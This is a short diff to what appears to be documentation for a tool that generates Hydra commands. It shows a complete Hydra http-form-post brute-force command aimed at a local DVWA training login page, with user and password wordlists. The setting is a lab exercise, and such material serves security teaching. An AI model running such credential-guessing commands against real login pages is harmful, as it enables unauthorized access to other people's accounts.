@@ -14,12 +14,10 @@ Example:
 >
 >--------------------------------------------
 >HYDRA COMMAND AUTOMATER RESULTS:
+>
 >"login.php:
->
 >username=^USER^
->
 >password=^PASS^
->
 >:Login failed"
 >
 >hydra http://localhost/DVWA-1.0.8/login.php http-form-post "login.php:username=^USER^&password=^PASS^:Login failed" -L user.txt -P >pass.txt -t 10
